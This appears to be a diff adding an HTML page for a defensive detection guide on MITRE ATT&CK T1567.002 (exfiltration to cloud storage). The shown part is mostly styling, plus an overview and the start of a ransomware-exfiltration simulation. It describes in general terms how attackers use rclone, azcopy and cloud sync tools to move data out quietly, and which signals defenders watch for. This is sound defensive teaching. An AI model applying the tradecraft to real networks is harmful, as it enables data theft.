@@ -1,0 +1,2334 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>T1567.002 · Exfiltration to Cloud Storage — ATT&CK Detection Guide</title>
+  <meta name="description" content="Beginner-friendly, defensive detection guide for MITRE ATT&CK T1567.002 (Exfiltration to Cloud Storage): rclone and azcopy abuse, cloud storage exfiltration before ransomware, Sigma rules, Splunk SPL, logs, mitigations and a GoldenJackal case study.">
+<link rel="canonical" href="https://souhaieb-marzouk.github.io/attack-knowledge-platform/techniques/T1567-Exfiltration-Over-Web-Service/002-Exfiltration-to-Cloud-Storage.html">
+  <script>
+  (function(){try{var t=localStorage.getItem('atk-theme');if(t!=='light'&&t!=='dark'){t=(window.matchMedia&&window.matchMedia('(prefers-color-scheme: light)').matches)?'light':'dark';}document.documentElement.setAttribute('data-theme',t);}catch(e){document.documentElement.setAttribute('data-theme','dark');}})();
+  </script>
+  <style>
+    :root[data-theme="dark"]{
+      --bg:#0b0f1a; --surface:#121a2e; --surface-2:#172138; --elevated:#1a2542; --text:#e7edf8; --muted:#9aa8c0;
+      --border:#24314e; --border-strong:#2f4066; --accent:#4f8cff; --accent-2:#22d3ee; --violet:#a78bfa;
+      --success:#34d399; --warning:#fbbf24; --danger:#f87171; --high:#fb923c; --low:#4ade80;
+      --shadow:0 8px 28px rgba(3,8,22,.45);
+      --code-bg:#0d1426;
+    }
+    :root[data-theme="light"]{
+      --bg:#f3f6fc; --surface:#ffffff; --surface-2:#f5f8ff; --elevated:#e9eefa; --text:#182238; --muted:#5a6a85;
+      --border:#d9e2f2; --border-strong:#c2d0ea; --accent:#2f6fe4; --accent-2:#0891b2; --violet:#7c5ce0;
+      --success:#0d9e6e; --warning:#b45309; --danger:#dc2626; --high:#c2410c; --low:#15803d;
+      --shadow:0 8px 24px rgba(24,42,88,.12);
+      --code-bg:#eef3fd;
+    }
+    *,*::before,*::after{box-sizing:border-box;}
+    html{scroll-behavior:smooth;}
+    body{
+      margin:0; background:var(--bg); color:var(--text);
+      font-family:system-ui,-apple-system,"Segoe UI",Roboto,"Helvetica Neue",Arial,sans-serif;
+      font-size:16.5px; line-height:1.65;
+      -webkit-font-smoothing:antialiased; text-rendering:optimizeLegibility;
+    }
+    code,pre,.mono,.kv .kv-v,.chip,.section-num,.tl-date,.ev-chip,.sim-chip{
+      font-family:ui-monospace,SFMono-Regular,Menlo,Consolas,"Liberation Mono",monospace;
+    }
+    code,.mono{overflow-wrap:anywhere;}
+    p{max-width:72ch; margin:0 0 14px;}
+    a{color:var(--accent); text-decoration:none;}
+    a:hover{text-decoration:underline;}
+    strong{color:var(--text);}
+    ul,ol{max-width:76ch; margin:0 0 14px; padding-left:22px;}
+    li{margin:4px 0;}
+    li::marker{color:var(--accent);}
+    :focus-visible{outline:2px solid var(--accent-2); outline-offset:2px; border-radius:4px;}
+    .skip-link{
+      position:absolute; left:-9999px; top:0; z-index:300; background:var(--accent); color:#fff;
+      padding:8px 14px; border-radius:0 0 9px 9px; font-weight:600;
+    }
+    .skip-link:focus{left:12px;}
+    .progress-bar{
+      position:fixed; top:0; left:0; right:0; height:3px; z-index:250; background:transparent; pointer-events:none;
+    }
+    .progress-bar span{
+      display:block; height:100%; width:0; background:linear-gradient(90deg,var(--accent),var(--accent-2));
+    }
+    /* ---------- Hero ---------- */
+    .hero{max-width:1280px; margin:0 auto; padding:52px 28px 10px;}
+    .kicker{
+      font-size:12.5px; letter-spacing:.14em; text-transform:uppercase; color:var(--accent-2);
+      font-weight:700; margin:0 0 14px; max-width:none;
+    }
+    .hero h1{
+      font-size:clamp(30px,4.4vw,38px); line-height:1.18; margin:0 0 14px; letter-spacing:-.01em;
+    }
+    .hero h1 .tid{
+      display:inline-block; color:var(--accent); background:var(--surface);
+      border:1px solid var(--border-strong); border-radius:9px; padding:1px 12px 2px;
+      font-family:ui-monospace,SFMono-Regular,Menlo,Consolas,"Liberation Mono",monospace;
+      font-size:.82em; vertical-align:2px; margin-right:10px;
+    }
+    .hero-intro{font-size:18.5px; color:var(--muted); max-width:74ch;}
+    .chip-row{display:flex; flex-wrap:wrap; gap:8px; margin:18px 0 22px;}
+    .chip{
+      font-size:13px; color:var(--text); background:var(--surface-2); border:1px solid var(--border);
+      padding:5px 12px; border-radius:999px; white-space:nowrap;
+    }
+    .chip b{color:var(--accent-2); font-weight:600;}
+    .fact-grid{display:grid; grid-template-columns:repeat(auto-fit,minmax(240px,1fr)); gap:14px; margin:0 0 8px;}
+    .fact-card{
+      background:var(--surface); border:1px solid var(--border); border-radius:14px;
+      box-shadow:var(--shadow); padding:16px 18px;
+    }
+    .fact-card .fact-label{
+      margin:0 0 6px; font-size:13px; font-weight:700; letter-spacing:.09em; text-transform:uppercase; color:var(--accent-2);
+    }
+    .fact-card p{margin:0; font-size:15px; color:var(--text);}
+    /* ---------- Layout / sidebar ---------- */
+    .layout{
+      max-width:1280px; margin:0 auto; padding:8px 28px 64px;
+      display:grid; grid-template-columns:270px minmax(0,1fr); column-gap:36px; align-items:start;
+    }
+    .toc{
+      position:sticky; top:24px; max-height:calc(100vh - 48px); overflow:auto;
+      background:var(--surface); border:1px solid var(--border); border-radius:14px;
+      box-shadow:var(--shadow); padding:16px 14px 18px; scrollbar-width:thin;
+    }
+    .theme-btn{
+      width:100%; display:flex; align-items:center; justify-content:center; gap:8px;
+      background:var(--surface-2); color:var(--text); border:1px solid var(--border-strong);
+      border-radius:9px; padding:9px 10px; font-size:14px; font-weight:600; cursor:pointer; margin-bottom:14px;
+    }
+    .theme-btn:hover{border-color:var(--accent);}
+    .toc-title{
+      font-size:12px; letter-spacing:.12em; text-transform:uppercase; color:var(--muted);
+      font-weight:700; margin:2px 0 10px;
+    }
+    .toc nav ul{list-style:none; margin:0; padding:0;}
+    .toc nav li{margin:1px 0;}
+    .toc-link{
+      display:block; padding:6px 9px; border-radius:9px; color:var(--muted); font-size:13.5px;
+      line-height:1.35; border-left:2px solid transparent;
+    }
+    .toc-link:hover{color:var(--text); background:var(--surface-2); text-decoration:none;}
+    .toc-link.active{color:var(--accent); background:var(--surface-2); border-left-color:var(--accent); font-weight:600;}
+    .toc-link.toc-sub{padding-left:20px; font-size:12.8px;}
+    /* ---------- Sections ---------- */
+    .content-section{margin:0 0 56px; scroll-margin-top:20px;}
+    .section-head{margin:0 0 18px; border-bottom:1px solid var(--border); padding-bottom:14px;}
+    .section-head h2{
+      display:flex; align-items:center; gap:12px; font-size:clamp(23px,2.6vw,27px); line-height:1.2;
+      margin:0 0 8px; letter-spacing:-.01em;
+    }
+    .section-num{
+      flex:0 0 auto; display:inline-flex; align-items:center; justify-content:center;
+      width:38px; height:38px; border-radius:9px; background:var(--elevated); color:var(--accent);
+      border:1px solid var(--border-strong); font-size:16px; font-weight:700;
+    }
+    .section-intro{color:var(--muted); margin:0; max-width:78ch;}
+    h3.sec-sub{
+      display:flex; align-items:center; gap:10px; font-size:clamp(19px,2vw,20.5px); margin:34px 0 12px;
+      line-height:1.25; scroll-margin-top:24px;
+    }
+    h3.sec-sub .sub-id{
+      font-family:ui-monospace,SFMono-Regular,Menlo,Consolas,"Liberation Mono",monospace;
+      font-size:.72em; color:var(--violet); background:var(--elevated); border:1px solid var(--border-strong);
+      border-radius:9px; padding:2px 9px; font-weight:700;
+    }
+    h4.block-title{font-size:17px; margin:22px 0 8px; line-height:1.3; color:var(--text);}
+    h4.block-title .mono-tag{
+      font-family:ui-monospace,SFMono-Regular,Menlo,Consolas,"Liberation Mono",monospace;
+      font-size:.8em; color:var(--accent-2); margin-right:8px;
+    }
+    /* ---------- Cards & grids ---------- */
+    .card{
+      background:var(--surface); border:1px solid var(--border); border-radius:14px;
+      box-shadow:var(--shadow); padding:18px 20px; margin:0 0 16px;
+    }
+    .card h4{margin:0 0 8px;}
+    .grid{display:grid; gap:14px; margin:0 0 16px;}
+    .grid.cols-2{grid-template-columns:repeat(2,minmax(0,1fr));}
+    .grid.cols-3{grid-template-columns:repeat(3,minmax(0,1fr));}
+    .grid .card{margin:0;}
+    /* ---------- Callouts ---------- */
+    .callout{
+      border:1px solid var(--border); border-left-width:4px; border-radius:12px;
+      background:var(--surface-2); padding:13px 16px; margin:14px 0 16px; max-width:80ch;
+    }
+    .callout p{margin:0 0 8px;}
+    .callout p:last-child{margin-bottom:0;}
+    .callout .callout-label{display:block; font-weight:700; margin-bottom:4px;}
+    .callout.note{border-left-color:var(--accent);}
+    .callout.note .callout-label{color:var(--accent);}
+    .callout.warning{border-left-color:var(--warning);}
+    .callout.warning .callout-label{color:var(--warning);}
+    .callout.practice{border-left-color:var(--success);}
+    .callout.practice .callout-label{color:var(--success);}
+    .callout.danger{border-left-color:var(--danger);}
+    .callout.danger .callout-label{color:var(--danger);}
+    /* ---------- Badges ---------- */
+    .badge{
+      display:inline-block; font-size:12px; font-weight:700; letter-spacing:.02em;
+      padding:3px 10px; border-radius:999px; border:1px solid var(--border-strong);
+      color:var(--text); background:var(--elevated); white-space:nowrap;
+    }
+    .sev-critical{color:#fff; background:var(--danger); border-color:var(--danger);}
+    .sev-high{color:#fff; background:var(--high); border-color:var(--high);}
+    .sev-medium{color:#1a1205; background:var(--warning); border-color:var(--warning);}
+    .sev-low{color:#04180c; background:var(--low); border-color:var(--low);}
+    .cat-windows,.cat-linux,.cat-macos,.cat-cloud,.cat-identity,.cat-esxi,.cat-network{
+      color:var(--accent-2); background:var(--surface-2); border-color:var(--border-strong); font-weight:600;
+    }
+    /* ---------- Key/value ---------- */
+    .kv{list-style:none; margin:0 0 14px; padding:0; max-width:none;}
+    .kv li{
+      display:grid; grid-template-columns:190px minmax(0,1fr); gap:12px; padding:7px 2px;
+      border-bottom:1px dashed var(--border); margin:0;
+    }
+    .kv li:last-child{border-bottom:0;}
+    .kv .kv-k{color:var(--muted); font-size:14px;}
+    .kv .kv-v{font-size:14.5px;}
+    /* ---------- Tables ---------- */
+    .table-wrap{overflow-x:auto; margin:14px 0 18px; border:1px solid var(--border); border-radius:12px; background:var(--surface);}
+    .table-wrap table{border-collapse:collapse; width:100%; min-width:640px; font-size:14.5px;}
+    .table-wrap th{
+      text-align:left; background:var(--elevated); color:var(--text); font-weight:700;
+      padding:10px 12px; border-bottom:1px solid var(--border-strong); white-space:nowrap;
+    }
+    .table-wrap td{padding:10px 12px; border-bottom:1px solid var(--border); vertical-align:top;}
+    .table-wrap tr:last-child td{border-bottom:0;}
+    .table-wrap td .mono, .table-wrap td code{font-size:13px;}
+    .row-emph td{background:var(--surface-2);}
+    /* ---------- Code blocks ---------- */
+    .code-block{border:1px solid var(--border); border-radius:12px; overflow:hidden; margin:14px 0 18px; background:var(--code-bg);}
+    .code-head{
+      display:flex; align-items:center; justify-content:space-between; gap:10px;
+      background:var(--elevated); border-bottom:1px solid var(--border); padding:7px 12px;
+    }
+    .code-title{
+      font-family:ui-monospace,SFMono-Regular,Menlo,Consolas,"Liberation Mono",monospace;
+      font-size:12.5px; color:var(--muted); font-weight:600;
+    }
+    .copy-btn{
+      font-size:12px; font-weight:600; color:var(--text); background:var(--surface);
+      border:1px solid var(--border-strong); border-radius:9px; padding:4px 10px; cursor:pointer;
+    }
+    .copy-btn:hover{border-color:var(--accent); color:var(--accent);}
+    .code-block pre{margin:0; padding:13px 15px; overflow:auto; font-size:13px; line-height:1.55;}
+    .code-block pre code{white-space:pre; color:var(--text);}
+    /* ---------- Timeline ---------- */
+    .timeline{position:relative; margin:16px 0 20px; padding-left:26px; list-style:none;}
+    .timeline::before{
+      content:""; position:absolute; left:9px; top:6px; bottom:6px; width:2px; background:var(--border-strong);
+    }
+    .timeline li{position:relative; margin:0 0 16px; padding:0;}
+    .timeline li::before{
+      content:""; position:absolute; left:-23px; top:7px; width:11px; height:11px; border-radius:50%;
+      background:var(--accent); border:2px solid var(--bg);
+    }
+    .tl-date{
+      display:inline-block; font-size:12.5px; font-weight:700; color:var(--accent-2);
+      background:var(--elevated); border:1px solid var(--border-strong); border-radius:9px;
+      padding:1px 9px; margin-bottom:5px;
+    }
+    .timeline p{margin:0 0 4px;}
+    /* ---------- Simulation ---------- */
+    .sim-stage{
+      background:var(--surface); border:1px solid var(--border); border-radius:14px;
+      box-shadow:var(--shadow); padding:16px; margin:0 0 16px;
+    }
+    .sim-canvas-wrap{position:relative; border:1px solid var(--border); border-radius:12px; overflow:hidden; background:var(--surface-2);}
+    #simCanvas{display:block; width:100%; height:auto; touch-action:pan-y;}
+    .sim-controls{
+      display:flex; flex-wrap:wrap; align-items:center; gap:8px; margin-top:12px;
+    }
+    .sim-btn{
+      font-size:14px; font-weight:600; color:var(--text); background:var(--elevated);
+      border:1px solid var(--border-strong); border-radius:9px; padding:8px 14px; cursor:pointer;
+    }
+    .sim-btn:hover{border-color:var(--accent); color:var(--accent);}
+    .sim-btn.primary{background:var(--accent); border-color:var(--accent); color:#fff;}
+    .sim-btn.primary:hover{color:#fff; filter:brightness(1.1);}
+    .sim-speed-label{font-size:13.5px; color:var(--muted); font-weight:600;}
+    .sim-speed{
+      font-size:14px; color:var(--text); background:var(--elevated);
+      border:1px solid var(--border-strong); border-radius:9px; padding:7px 8px; cursor:pointer;
+    }
+    .sim-chips{display:flex; flex-wrap:wrap; gap:6px; margin-top:10px;}
+    .sim-chip{
+      font-size:12px; font-weight:600; color:var(--muted); background:var(--surface-2);
+      border:1px solid var(--border); border-radius:999px; padding:4px 11px; cursor:pointer;
+    }
+    .sim-chip:hover{color:var(--text); border-color:var(--border-strong);}
+    .sim-chip.active{color:#fff; background:var(--accent); border-color:var(--accent);}
+    .sim-caption{
+      margin-top:14px; font-size:15.5px; font-weight:600; color:var(--text);
+      background:var(--elevated); border:1px solid var(--border-strong); border-radius:12px; padding:10px 14px;
+    }
+    .sim-hint{
+      margin-top:10px; font-size:14.5px; color:var(--muted); border-left:3px solid var(--accent-2);
+      padding:2px 0 2px 12px;
+    }
+    .sim-hint b{color:var(--accent-2);}
+    .sim-evidence{display:flex; flex-wrap:wrap; gap:7px; margin-top:12px; min-height:28px;}
+    .ev-chip{
+      font-size:12px; color:var(--text); background:var(--surface-2); border:1px dashed var(--border-strong);
+      border-radius:999px; padding:3px 11px;
+    }
+    .ev-chip::before{content:"▍"; color:var(--accent); margin-right:6px;}
+    .sim-evidence .ev-chip{opacity:.4; transition:opacity .3s ease;}
+    .sim-evidence .ev-chip.lit{opacity:1; border-style:solid; background:var(--elevated);}
+    #simCanvas{cursor:crosshair;}
+    .sim-soc{
+      margin-top:14px; border:1px solid var(--border); border-left:4px solid var(--violet);
+      background:var(--surface-2); border-radius:12px; padding:11px 14px; font-size:14.5px;
+    }
+    .sim-soc b{color:var(--violet);}
+    .sim-tooltip{
+      position:fixed; z-index:400; max-width:280px; background:var(--elevated); color:var(--text);
+      border:1px solid var(--border-strong); border-radius:10px; box-shadow:var(--shadow);
+      padding:9px 12px; font-size:13px; pointer-events:none; display:none;
+    }
+    .sim-tooltip b{color:var(--accent-2); display:block; margin-bottom:2px;}
+    .sim-legend{display:flex; flex-wrap:wrap; gap:10px; margin-top:12px; font-size:13px; color:var(--muted);}
+    .sim-legend span b{color:var(--text);}
+    /* ---------- Mistakes ---------- */
+    .mistake-card{border-top:3px solid var(--danger);}
+    .mk-field{margin:7px 0 0; font-size:14.5px;}
+    .mk-field b{color:var(--accent-2);}
+    .habits .card h4{color:var(--accent-2); font-size:15px;}
+    /* ---------- Checklist / links ---------- */
+    .checklist{list-style:none; padding:0; max-width:none;}
+    .checklist li{
+      padding:8px 12px 8px 38px; position:relative; border:1px solid var(--border);
+      border-radius:10px; margin:0 0 8px; background:var(--surface-2);
+    }
+    .checklist li::before{
+      content:"✓"; position:absolute; left:13px; top:7px; color:var(--success); font-weight:700;
+    }
+    .link-list{list-style:none; padding:0; max-width:none;}
+    .link-list li{padding:7px 0; border-bottom:1px dashed var(--border);}
+    .link-list li:last-child{border-bottom:0;}
+    /* ---------- Floating buttons & overlay ---------- */
+    .float-btn{
+      position:fixed; right:18px; z-index:260; border:1px solid var(--border-strong);
+      background:var(--elevated); color:var(--text); border-radius:999px; box-shadow:var(--shadow);
+      font-size:14px; font-weight:600; cursor:pointer;
+    }
+    #tocOpen{bottom:20px; padding:11px 18px; display:none;}
+    #backToTop{
+      bottom:70px; width:44px; height:44px; font-size:18px; line-height:1;
+      opacity:0; pointer-events:none; transition:opacity .25s ease;
+    }
+    #backToTop.show{opacity:1; pointer-events:auto;}
+    .overlay{
+      position:fixed; inset:0; z-index:270; background:rgba(5,9,20,.62);
+      display:flex; align-items:flex-start; justify-content:center; padding:6vh 16px 16px;
+    }
+    .overlay[hidden]{display:none;}
+    .overlay-card{
+      width:min(560px,100%); max-height:80vh; overflow:auto; background:var(--surface);
+      border:1px solid var(--border-strong); border-radius:14px; box-shadow:var(--shadow); padding:18px;
+    }
+    .overlay-head{display:flex; align-items:center; justify-content:space-between; margin-bottom:10px;}
+    .overlay-title{font-size:19px; margin:0; font-weight:700; color:var(--text);}
+    .overlay-close{
+      background:var(--elevated); color:var(--text); border:1px solid var(--border-strong);
+      border-radius:9px; padding:6px 12px; font-size:13px; font-weight:600; cursor:pointer;
+    }
+    .overlay-card ul{list-style:none; margin:0; padding:0;}
+    .overlay-card li{margin:2px 0;}
+    /* ---------- Responsive ---------- */
+    @media (max-width:1040px){
+      .layout{grid-template-columns:minmax(0,1fr); padding-top:12px;}
+      .toc{display:none;}
+      #tocOpen{display:block;}
+    }
+    @media (max-width:640px){
+      body{font-size:16px;}
+      .hero{padding:36px 16px 6px;}
+      .layout{padding:6px 14px 56px;}
+      .grid.cols-2,.grid.cols-3{grid-template-columns:minmax(0,1fr);}
+      .fact-grid{grid-template-columns:minmax(0,1fr);}
+      .sim-btn,.sim-speed{flex:1 1 auto;}
+      .kv li{grid-template-columns:minmax(0,1fr); gap:2px;}
+      .chip{white-space:normal;}
+    }
+    @media (prefers-reduced-motion: reduce){
+      html{scroll-behavior:auto;}
+      *,*::before,*::after{animation:none !important; transition:none !important;}
+    }
+    /* ---------- Print ---------- */
+    @media print{
+      :root{color-scheme:light;}
+      body{background:#fff; color:#111;}
+      .toc,.progress-bar,.float-btn,.overlay,.sim-controls,.sim-chips,.copy-btn,.skip-link{display:none !important;}
+      .layout{display:block; max-width:none; padding:0;}
+      .card,.sim-stage,.code-block,.table-wrap{box-shadow:none; break-inside:avoid;}
+      .code-block pre{white-space:pre-wrap;}
+      .content-section{break-inside:auto;}
+      a{color:#1a4fb0;}
+      .hero h1 .tid{background:#eef; border-color:#99a;}
+    }
+  </style>
+</head>
+<body>
+  <!-- ==== PLATFORM INTEGRATION (paste right after <body>) ==== -->
+  <link rel="stylesheet" href="../../assets/css/platform.css">
+  <div id="atk-header" data-technique="T1567.002"></div>
+  <script src="../../assets/js/platform.js" defer></script>
+  <!-- ==== /PLATFORM INTEGRATION ==== -->
+  <a class="skip-link" href="#main-content">Skip to main content</a>
+  <div class="progress-bar" aria-hidden="true"><span id="progressFill"></span></div>
+
+  <section class="hero">
+    <p class="kicker">MITRE ATT&amp;CK · EXFILTRATION · TA0010 · SUB-TECHNIQUE</p>
+    <h1><span class="tid">T1567.002</span> Exfiltration to Cloud Storage</h1>
+    <p class="hero-intro">In this technique, stolen data is uploaded to a cloud storage service instead of being sent out over the attacker&rsquo;s normal command-and-control channel. Think of services like Mega, Dropbox, Google Drive, OneDrive, or an attacker-owned S3 or Blob bucket &mdash; most often reached with a command-line tool such as <code>rclone</code> or <code>azcopy</code>. Because that traffic is encrypted and looks like everyday file sync, it is one of the quietest ways to move a whole company&rsquo;s data out of the network.</p>
+    <div class="chip-row">
+      <span class="chip"><b>Tactic:</b> Exfiltration</span>
+      <span class="chip"><b>ID:</b> T1567.002</span>
+      <span class="chip"><b>Parent:</b> T1567 (Exfiltration Over Web Service)</span>
+      <span class="chip"><b>Platforms:</b> ESXi · Linux · Windows · macOS</span>
+      <span class="chip"><b>Type:</b> Sub-technique</span>
+      <span class="chip"><b>Technique version:</b> 1.3 · created 09 March 2020 · last modified 12 May 2026</span>
+    </div>
+    <div class="fact-grid">
+      <div class="fact-card">
+        <p class="fact-label">What happens</p>
+        <p>A tool such as rclone, azcopy, aws cli or a native sync client uploads whole folders &mdash; sometimes hundreds of gigabytes &mdash; to cloud storage the attacker controls or can read.</p>
+      </div>
+      <div class="fact-card">
+        <p class="fact-label">Chain position</p>
+        <p>Final stage of the attack chain. It is famous as the step that happens right before ransomware encryption in modern double-extortion attacks.</p>
+      </div>
+      <div class="fact-card">
+        <p class="fact-label">Biggest risk</p>
+        <p>Huge, fast and quiet. The upload can finish in a few hours, fully encrypted, and the encryption notice may arrive the same night &mdash; after the data is already gone.</p>
+      </div>
+      <div class="fact-card">
+        <p class="fact-label">Detect with</p>
+        <p>First-seen alerts for command-line (CLI) upload tools, rclone.conf file creation, proxy and cloud access security broker (CASB) upload-volume baselines, OAuth consent grants, and DNS/SNI hits on storage endpoints.</p>
+      </div>
+    </div>
+  </section>
+
+  <div class="layout">
+    <aside class="toc" aria-label="Table of contents">
+      <button id="themeToggle" class="theme-btn" type="button" aria-label="Switch color theme">◐ Theme: <span id="themeLabel">Dark</span></button>
+      <p class="toc-title">On this page</p>
+      <nav id="tocNav" aria-label="Section navigation"><!-- JS builds links from the REAL headings --></nav>
+      <noscript>
+        <ul>
+          <li><a class="toc-link" href="#sec-1-overview">1 · Overview</a></li>
+          <li><a class="toc-link" href="#sec-2-simulation">2 · Animated Simulation</a></li>
+          <li><a class="toc-link" href="#sec-3-red-team">3 · Red Team Perspective</a></li>
+          <li><a class="toc-link" href="#sec-4-blue-team">4 · Blue Team Perspective</a></li>
+          <li><a class="toc-link" href="#sec-5-detection">5 · Detection Engineering Deep Dive</a></li>
+          <li><a class="toc-link toc-sub" href="#sec-5-1-regulation">5.1 · Regulation Mapping</a></li>
+          <li><a class="toc-link toc-sub" href="#sec-5-2-intel">5.2 · Threat Intelligence</a></li>
+          <li><a class="toc-link toc-sub" href="#sec-5-3-threats">5.3 · Threat Ranking</a></li>
+          <li><a class="toc-link toc-sub" href="#sec-5-4-logs">5.4 · Logs and Patterns</a></li>
+          <li><a class="toc-link toc-sub" href="#sec-5-5-rules">5.5 · Sigma and Splunk</a></li>
+          <li><a class="toc-link" href="#sec-6-case-study">6 · Real-World Case Study</a></li>
+          <li><a class="toc-link" href="#sec-7-mitigation">7 · Mitigation and Defense</a></li>
+          <li><a class="toc-link" href="#sec-8-mistakes">8 · Common Mistakes</a></li>
+          <li><a class="toc-link" href="#sec-9-cheat-sheet">9 · Cheat Sheet</a></li>
+        </ul>
+      </noscript>
+    </aside>
+    <main id="main-content">
+      <section id="sec-1-overview" class="content-section">
+        <div class="section-head">
+          <span class="section-num">1</span>
+          <h2>Overview</h2>
+          <p class="section-intro">What this technique is, why it is one of the most damaging steps in modern attacks, and what this guide teaches you to do about it.</p>
+        </div>
+        <p><strong>Exfiltration to Cloud Storage (T1567.002)</strong> means an adversary copies data out of a victim network by uploading it to a cloud storage service. Instead of streaming stolen files through a slow botnet channel, the attacker uses a normal, trusted service. Think Mega, Dropbox, Google Drive, OneDrive, Box, or their own S3 bucket or Azure Blob storage. The upload is usually done with a fast command-line tool such as <code>rclone</code>, <code>azcopy</code>, or <code>aws s3 cp</code>, or sometimes with the official desktop sync client itself.</p>
+        <p>The technique is popular for three simple reasons. First, the traffic is encrypted with TLS (Transport Layer Security, the same protocol that protects normal HTTPS), so defenders see only &ldquo;HTTPS to a well-known provider&rdquo;. Second, many companies already sync files to these providers, so one more host uploading files does not stand out by destination alone. Third, the bandwidth is effectively free &mdash; a tool like rclone can push hundreds of gigabytes in a few hours with parallel transfers, throttled only by the link itself.</p>
+        <p>In the attack chain, this technique sits at the very end, after the adversary has gained access, moved around, and <em>collected</em> data. That position gives it special weight: if you see it, the breach is already nearly complete. In ransomware cases it is also your best early warning. Many groups first copy the victim&rsquo;s data to cloud storage, then &mdash; hours later &mdash; start encrypting. If you catch the upload, you may still prevent the encryption and the extortion call.</p>
+        <div class="callout note">
+          <span class="callout-label">Note · What you will learn</span>
+          <p>This guide walks the full journey: an animated attack story, the attacker&rsquo;s playbook, and the defender&rsquo;s artifacts. Then it adds six ranked threat scenarios with logs. You also get complete Sigma rules (a detection-rule format) and Splunk queries, a real case study (GoldenJackal), mitigations, common blue-team mistakes, and a cheat sheet. Everything is written for beginners and focused on <strong>detection engineering</strong>.</p>
+        </div>
+        <h4 class="block-title">Key facts</h4>
+        <ul class="kv">
+          <li><span class="kv-k">ATT&amp;CK ID / Tactic</span><span class="kv-v mono">T1567.002 · Exfiltration (TA0010) · sub-technique of T1567.</span></li>
+          <li><span class="kv-k">ATT&amp;CK data</span><span class="kv-v">Version 1.3 · created 09 March 2020 · last modified 12 May 2026 (attack.mitre.org).</span></li>
+          <li><span class="kv-k">Platforms</span><span class="kv-v">ESXi (VMware virtualization hosts), Linux, Windows, macOS (ATT&amp;CK v1.3).</span></li>
+          <li><span class="kv-k">Typical tools</span><span class="kv-v mono">rclone, azcopy, aws s3 cp, MEGAcmd, megasync, Dropbox/OneDrive sync clients, custom uploaders.</span></li>
+          <li><span class="kv-k">Typical targets</span><span class="kv-v">File servers, finance, HR (human resources) and R&amp;D (research and development) shares, mailbox and cloud-drive content, database dumps, backup archives.</span></li>
+          <li><span class="kv-k">ATT&amp;CK examples &mdash; actors</span><span class="kv-v">Listed on the ATT&amp;CK page: G1024 Akira, C0040 APT41 DUST, G0114 Chimera, G0142 Confucius, G1052 Contagious Interview, G1021 Cinnamon Tempest, and campaign C0015 (rclone to MEGA).</span></li>
+          <li><span class="kv-k">ATT&amp;CK examples &mdash; software</span><span class="kv-v">S0635 BoomBox, S0651 BoxCaon, S0660 Clambling, S1023 CreepyDrive and S0538 Crutch are the listed software examples; public write-ups tie BoomBox and Crutch to Dropbox.</span></li>
+          <li><span class="kv-k">Privacy impact</span><span class="kv-v">Personal data, health records, payment card data and trade secrets can leave the controlled environment &mdash; triggering breach-notification duties (see 5.1).</span></li>
+        </ul>
+        <h4 class="block-title">Why volume and identity are the real signals</h4>
+        <p>Destination alone will not save you: attackers know which providers you whitelist. The strongest signals are <strong>behavior over time</strong>. A server that has never uploaded anything suddenly uploads tens of gigabytes. A tool that has never run on any host appears at 03:00. A user consents to an unknown app that can read every file in the tenant. This guide builds detections around exactly those ideas &mdash; tool first-seen, config-file creation, volume baselines, and identity events.</p>
+        <div class="callout practice">
+          <span class="callout-label">Good practice · Lab-only testing</span>
+          <p>Every red-team command in this guide is written for a <strong>lab you own</strong>. That means a test VM, a local S3 emulator such as MinIO, or your personal cloud account with dummy files. Never point these tools at systems, data, or accounts that are not yours. The goal is to understand the signals, not to hide from them.</p>
+        </div>
+      </section>
+      <section id="sec-2-simulation" class="content-section">
+        <div class="section-head">
+          <span class="section-num">2</span>
+          <h2>Animated Simulation: Exfiltration Before Encryption</h2>
+          <p class="section-intro">A fictional but realistic 8-step story: an attacker steals files from a corporate file server to Mega, then triggers the ransomware. Watch both the attacker&rsquo;s moves and what the security operations center (SOC) can see at the same time.</p>
+        </div>
+        <p>The diagram shows four actors. <strong>Attacker</strong> is the operator&rsquo;s infrastructure: a rented virtual private server (VPS), a stolen virtual private network (VPN) account, and a Mega account they control. <strong>FS01</strong> is the victim: a Windows file server holding finance, HR and R&amp;D shares. <strong>Cloud</strong> is the attacker&rsquo;s cloud storage bucket on Mega (it could be any provider). <strong>SOC</strong> is the defensive team, watching endpoint detection and response (EDR), proxy and CASB telemetry. Move through the steps with the buttons, or press Play to watch the chain unfold. Hover or tap any node to see what it means.</p>
+        <div class="sim-stage">
+          <div class="sim-canvas-wrap">
+            <canvas id="simCanvas" role="img" aria-label="Animated diagram: an attacker uploads stolen files from file server FS01 to Mega cloud storage, then triggers ransomware. The SOC panel shows the defender view for each step."></canvas>
+          </div>
+          <div class="sim-controls" role="group" aria-label="Simulation controls">
+            <button id="simPlay" class="sim-btn primary" type="button">▶ Play</button>
+            <button id="simPause" class="sim-btn" type="button">⏸ Pause</button>
+            <button id="simRestart" class="sim-btn" type="button">↺ Restart</button>
+            <button id="simPrev" class="sim-btn" type="button" aria-label="Previous step">◀ Prev</button>
+            <button id="simNext" class="sim-btn" type="button" aria-label="Next step">Next ▶</button>
+            <label class="sim-speed-label" for="simSpeed">Speed</label>
+            <select id="simSpeed" class="sim-speed">
+              <option value="0.5">0.5×</option>
+              <option value="1" selected>1×</option>
+              <option value="2">2×</option>
+            </select>
+          </div>
+          <div class="sim-chips" id="simChips" role="group" aria-label="Simulation steps"></div>
+          <p class="sim-caption" id="simCaption" aria-live="polite">Step 1 of 8 — press Play or use Next to begin.</p>
+          <p class="sim-hint" id="simHint"><b>What the defender sees:</b> waiting for the story to start.</p>
+          <div class="sim-evidence" id="simEvidence" aria-label="Evidence for this step">
+            <span class="ev-chip" data-step="2">dir sweeps</span>
+            <span class="ev-chip" data-step="3">7z temp file</span>
+            <span class="ev-chip" data-step="4">rclone.conf create</span>
+            <span class="ev-chip" data-step="5">proxy baseline break</span>
+            <span class="ev-chip" data-step="6">USN delete</span>
+            <span class="ev-chip" data-step="8">encryption events (late)</span>
+            <span class="ev-chip" data-step="8">rclone alert timeline</span>
+          </div>
+          <div class="sim-soc" id="simSoc" aria-live="polite"><b>SOC view:</b> the panel updates as the story advances.</div>
+          <div class="sim-legend" aria-hidden="true">
+            <span><b>●</b> Attacker</span>
+            <span><b>●</b> FS01 (victim)</span>
+            <span><b>●</b> Cloud (Mega)</span>
+            <span><b>●</b> SOC</span>
+            <span><b>→</b> data / command flow</span>
+          </div>
+        </div>
+        <div class="sim-tooltip" id="simTooltip" role="status"></div>
